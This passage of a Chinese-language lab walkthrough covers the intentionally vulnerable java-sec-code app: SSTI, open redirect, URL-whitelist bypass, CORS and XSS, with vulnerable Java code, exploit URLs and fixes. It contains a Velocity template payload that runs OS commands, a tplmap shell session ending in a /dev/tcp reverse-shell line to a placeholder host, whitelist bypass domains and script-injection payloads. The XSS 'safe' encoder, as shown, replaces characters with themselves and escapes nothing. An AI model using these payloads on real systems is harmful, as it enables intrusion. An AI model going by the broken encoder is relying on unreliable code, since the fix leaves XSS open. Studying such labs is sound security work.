StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问URL：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.16:8080&#x2F;java_sec_code_war&#x2F;ssti&#x2F;velocity?template&#x3D;%23set($e&#x3D;%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png" alt="image-20211027143734728"></p><p>也可以使用<a href="https://github.com/epinna/tplmap来验证">https://github.com/epinna/tplmap来验证</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br><span class="line">python tplmap.py --os-shell -u &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;ssti&#x2F;velocity?template&#x3D;aa&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Testing if GET parameter &#39;template&#39; is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Twig plugin is testing blind injection</span><br><span class="line">[+] Freemarker plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Freemarker plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Velocity plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin has confirmed blind injection</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: template</span><br><span class="line">  Engine: Velocity</span><br><span class="line">  Injection: *</span><br><span class="line">  Context: text</span><br><span class="line">  OS: undetected</span><br><span class="line">  Technique: blind</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok (blind)</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok (blind)</span><br><span class="line">   File read: no</span><br><span class="line">   Code evaluation: no</span><br><span class="line"></span><br><span class="line">[+] Blind injection has been found and command execution will not produce any output.</span><br><span class="line">[+] Delay is introduced appending &#39;&amp;&amp; sleep &lt;delay&gt;&#39; to the shell commands. True or False is returned whether it returns successfully or not.</span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"> (blind) $ id</span><br><span class="line">True</span><br><span class="line"> (blind) $ whoami</span><br><span class="line">True</span><br><span class="line"> (blind) $ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;reverse_ip&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>修复意见：</p><p>针对于不同的模板引擎，该漏洞的修复方法会有所不同，但如果在传递给模板指令之前，对用户输入进行安全过滤的话，则可以大大减少这类威胁。此外，另一种防御方法是使用沙箱环境，将危险的指令删除/禁用，或者对系统环境进行安全加固。</p><ol><li><a href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心</a></li></ol><h2 id="16-URLRedirect"><a href="#16-URLRedirect" class="headerlink" title="16.URLRedirect"></a>16.URLRedirect</h2><p>url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼。</p><p>url跳转常见的地方</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 登陆跳转我认为是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</span><br><span class="line">2. 用户分享、收藏内容过后，会跳转</span><br><span class="line">3. 跨站点认证、授权后，会跳转</span><br><span class="line">4. 站内点击其它网址链接时，会跳转</span><br><span class="line">5. 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</span><br><span class="line">6. 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</span><br></pre></td></tr></table></figure><p>url跳转常用到的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect</span><br><span class="line">url</span><br><span class="line">redirectUrl</span><br><span class="line">callback</span><br><span class="line">return_url</span><br><span class="line">toUrl</span><br><span class="line">ReturnUrl</span><br><span class="line">fromUrl</span><br><span class="line">redUrl</span><br><span class="line">request</span><br><span class="line">redirect_to</span><br><span class="line">redirect_url</span><br><span class="line">jump</span><br><span class="line">jump_to</span><br><span class="line">target</span><br><span class="line">to</span><br><span class="line">goto</span><br><span class="line">link</span><br><span class="line">linkto</span><br><span class="line">domain</span><br><span class="line">oauth_callback</span><br></pre></td></tr></table></figure><p>核心代码：</p><p>重定向跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>301跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;setHeader&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); &#x2F;&#x2F; 301 redirect</span><br><span class="line">    response.setHeader(&quot;Location&quot;, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>302跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;sendRedirect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.sendRedirect(url); &#x2F;&#x2F; 302 redirect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复方式：</p><p>只能内部跳转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;forward&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void forward(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    RequestDispatcher rd &#x3D; request.getRequestDispatcher(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        rd.forward(request, response);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过checkURL去检查输入的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(&quot;&#x2F;sendRedirect&#x2F;sec&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">        if (SecurityUtil.checkURL(url) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(&quot;url forbidden&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 同时支持一级域名和多级域名，相关配置在resources目录下url&#x2F;url_safe_domain.xml文件。</span><br><span class="line"> * 优先判断黑名单，如果满足黑名单return null。</span><br><span class="line"> *</span><br><span class="line"> * @param url the url need to check</span><br><span class="line"> * @return Safe url returns original url; Illegal url returns null;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public static String checkURL(String url) &#123;</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; url)&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; safeDomains &#x3D; WebConfig.getSafeDomains();</span><br><span class="line">    ArrayList&lt;String&gt; blockDomains &#x3D; WebConfig.getBlockDomains();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String host &#x3D; gethost(url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">        if (!isHttp(url)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果满足黑名单返回null</span><br><span class="line">        if (blockDomains.contains(host))&#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        for(String blockDomain: blockDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + blockDomain)) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持多级域名</span><br><span class="line">        if (safeDomains.contains(host))&#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持一级域名</span><br><span class="line">        for(String safedomain: safeDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + safedomain)) &#123;</span><br><span class="line">                return url;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; catch (NullPointerException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测相关url是否在自己配置中，若不在则返回NULL</p><h2 id="17-URLWhiteList"><a href="#17-URLWhiteList" class="headerlink" title="17.URLWhiteList"></a>17.URLWhiteList</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote><blockquote><p>安全工程师：接口需要验证参数中的URL是否是内部域名。<br>开发工程师：好的，没问题。</p></blockquote></blockquote><p>如果不使用已经写好的安全框架，真正让开发去添加一个URL白名单，我相信不少人会出现不同程度的安全问题。</p><p>所以，我觉得有必要单独拿出来简单说下这个问题。</p><h3 id="2-可造成的漏洞"><a href="#2-可造成的漏洞" class="headerlink" title="2.可造成的漏洞"></a>2.可造成的漏洞</h3><p>和URL有关系的漏洞，我们可以联想到包括但不局限于下面的漏洞</p><ul><li>CSRF</li><li>JSONP</li><li>SSRF</li><li>URL跳转</li><li>绕过CORS(跨域资源分享)</li></ul><h3 id="3-Bypass-Poc及实际案例"><a href="#3-Bypass-Poc及实际案例" class="headerlink" title="3.Bypass Poc及实际案例"></a>3.Bypass Poc及实际案例</h3><p>先来看一下应该如何安全验证：</p><p>先来看下应该如何安全验证：</p><ul><li>取一级域名</li><li>判断一级域名是否在白名单里</li></ul><p>但是，在实际的甲方安全中，很多开发者会犯以下的一些错误。</p><h4 id="1-endsWith"><a href="#1-endsWith" class="headerlink" title="1.endsWith"></a>1.endsWith</h4><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure><p>案例：<br>飞猪做referer校验的时候，全站存在referer校验bypass问题，导致全站存在Json Hijack等漏洞，可以拿到飞猪的开房记录等信息。目前漏洞已经修复。</p><p>绕过的poc</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.joychoualitrip.com&#x2F;mytrip&#x2F;</span><br></pre></td></tr></table></figure><p>针对JSONP，这里提一个比较有趣的问题。有的接口返回是JSON，非JSONP的格式，但是由于开发者写了一个callback参数（但是流量里并未出现）。所以在自动动扫描漏洞时，扫描器可加上<code>callback、cback</code>等参数，可能会有意想不到的收获。</p><p>比如：<code>http://www.alitrip.com/order?id=1</code>返回JSON格式，所以并不存在JSON劫持。但是访问<code>http://www.alitrip.com/order?id=1&amp;callback=xxx</code>可能就会返回JSONP格式，从而可能存在JSON劫持漏洞。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;endsWith&quot;)</span><br><span class="line"> public String endsWith(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">     String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">     for (String domain : domainwhitelist) &#123;</span><br><span class="line">         if (host.endsWith(domain)) &#123;</span><br><span class="line">             return &quot;Good url.&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return &quot;Bad url.&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;endsWith?url&#x3D;http:&#x2F;&#x2F;aaajoychou.org</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png" alt="image-20211027151121258"></p><h4 id="2-contains"><a href="#2-contains" class="headerlink" title="2.contains"></a>2.contains</h4><p>取出一级域名。判断一级域名在白名单列表里使用contains判断</p><p>Bypass POC：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.com.bypass.com</span><br><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;contains&quot;)</span><br><span class="line">public String contains(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String domain : domainwhitelist) &#123;</span><br><span class="line">        if (host.contains(domain)) &#123;</span><br><span class="line">            return &quot;Good url.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;contains?url&#x3D;http:&#x2F;&#x2F;joychou.org.bypass.com</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png" alt="image-20211027151454711"></p><h4 id="3-statsWith"><a href="#3-statsWith" class="headerlink" title="3.statsWith"></a>3.statsWith</h4><p>取出一级域名，判断一级域名在白名单列表里使用<code>startsWith</code>判断</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.combypass</span><br></pre></td></tr></table></figure><p>这种域名后缀虽然不存在，造成无法利用。但是在实际的测试中，确实发现某大公司是以这样的方式写的代码。所以说，如果没有规范，什么样的逻辑代码都能写出来。</p><h4 id="4-正则表达式"><a href="#4-正则表达式" class="headerlink" title="4.正则表达式"></a>4.正则表达式</h4><p>用正则表达式去匹配URL中是否存在<code>www.joychou.com</code>字符串<br>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com.bypass.com</span><br></pre></td></tr></table></figure><p>还有的URL接口验证是否是图片链接，但是验证的方式居然是用正则匹配是否以类似<code>.800*600.</code>结尾。</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com&#x2F;_4528x2020.php</span><br></pre></td></tr></table></figure><p>用正则判断host是否是域名</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.10.xip.io</span><br></pre></td></tr></table></figure><p>案例：<br>腾讯某域名诊断功能存在SSRF（目前该漏洞已经修复）。<br>该功能验证逻辑，首先判断host是否是域名。</p><p>所以我们可以利用<code>xip.io</code>进行Bypass。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;regex&quot;)</span><br><span class="line">public String regex(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line">    Pattern p &#x3D; Pattern.compile(&quot;joychouorg&quot;);</span><br><span class="line">    Matcher m &#x3D; p.matcher(host);</span><br><span class="line"></span><br><span class="line">    if (m.find()) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;Bad url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png" alt="image-20211027151840814"></p><h4 id="5-正则匹配URL是否以-joychou-com"><a href="#5-正则匹配URL是否以-joychou-com" class="headerlink" title="5.正则匹配URL是否以.joychou.com"></a>5.正则匹配URL是否以.joychou.com</h4><p>正则为<code>.*\\.joychou.com$</code>的情况，之前的这两种<code>xxx.xxxjoychou.com</code>和<code>xxx.joychou.com.xxx</code>都不能绕过了。</p><p>Bypass Poc：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.baidu.com&#x2F;?xxx.joychou.com</span><br></pre></td></tr></table></figure><h3 id="4-安全代码和测试环境"><a href="#4-安全代码和测试环境" class="headerlink" title="4.安全代码和测试环境"></a>4.安全代码和测试环境</h3><p>安全代码逻辑很简单：</p><ul><li>取一级域名</li><li>判断一级域名是否在白名单里。</li></ul><p>方法调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] urlwhitelist = &#123;<span class="string">&quot;joychou.com&quot;</span>, <span class="string">&quot;joychou.me&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>方法代码：</p><p>需要先添加guava库（目的是获取一级域名）</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;sec&quot;)</span><br><span class="line">public String sec(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String whiteDomainlists[] &#x3D; &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String whiteHost: whiteDomainlists)&#123;</span><br><span class="line">        if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125; else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;array_indexOf&quot;)</span><br><span class="line">public String sec_array_indexOf(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Define muti-level host whitelist.</span><br><span class="line">    ArrayList&lt;String&gt; whiteDomainlists &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    whiteDomainlists.add(&quot;bbb.joychou.org&quot;);</span><br><span class="line">    whiteDomainlists.add(&quot;ccc.bbb.joychou.org&quot;);</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    if (whiteDomainlists.indexOf(host) !&#x3D; -1) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-CORS绕过"><a href="#5-CORS绕过" class="headerlink" title="5.CORS绕过"></a>5.CORS绕过</h3><p>先来看看<code>Access-Control-Allow-Origin</code>的使用。一般有两种方式设置该值：</p><ul><li>后端代码设置</li><li>Nginx等Web服务器设置</li></ul><p>域名设置<code>test.joychou.org</code>如下，表示该域名只接受来自<code>http://blacktech.com</code>的请求。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header  Access-Control-Allow-Origin &#39;http:&#x2F;&#x2F;blacktech.com&#39;;</span><br></pre></td></tr></table></figure><p>本地写一份请求<code>test.joychou.org</code>的代码，保存为1.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">        type: &#39;GET&#39;,</span><br><span class="line">        url: &#39;http:&#x2F;&#x2F;test.joychou.org&#39;,</span><br><span class="line">        success: function (data) &#123;</span><br><span class="line">            alert(data);</span><br><span class="line">            console.log(&#39;Yeah! Load Success.&#39;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (error) &#123;</span><br><span class="line">            alert(&#39;Oh,no! Load Failed.&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>请求<code>http://localhost/1.html</code>报错如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Failed to load http:&#x2F;&#x2F;test.joychou.org&#x2F;: The &#39;Access-Control-Allow-Origin&#39; header has a value &#39;http:&#x2F;&#x2F;blacktech.com&#39; that is not equal to the supplied origin. Origin &#39;http:&#x2F;&#x2F;localhost&#39; is therefore not allowed access.</span><br></pre></td></tr></table></figure><p>改下<code>/etc/hosts</code>，把 localhost 改成 blacktech.com，请求<code>http://blacktech.com/1.html</code>就不会报错了，而且能获取到<br><a href="http://test.joychou.org/">http://test.joychou.org</a> 的返回内容<code>It works.</code></p><p>我们来看看<code>origin</code>，这个值和Referer一样，前端不能设置，如果<code>http://baidu.com</code>对<code>http://test.joychou.org</code>发起一个跨域请求，那么<code>origin</code>的值就为<code>http://baidu.com</code>。</p><p>那么问题来了，如果<code>Access-Control-Allow-Origin</code>设置的域名能被绕过，那么用请求header里的<code>origin</code>绕即可。绕过后，就能获取接口的数据，和JSONP一样。</p><h2 id="18-XSS"><a href="#18-XSS" class="headerlink" title="18.XSS"></a>18.XSS</h2><p>XSS作者提供了两种利用场景</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png" alt="image-20211027153333287"></p><p>这里还展示一种将XSS语句带入cookie，然后在其他处调出造成XSS的可能性</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">    Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    return &quot;Set param into cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;show&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;store?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;show</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png" alt="image-20211027153527388"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safe&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String safe(String xss) &#123;</span><br><span class="line">    return encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static String encode(String origin) &#123;</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&quot;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">    return origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将特殊字符进行转译</p><h2 id="19-XStreamRCE"><a href="#19-XStreamRCE" class="headerlink" 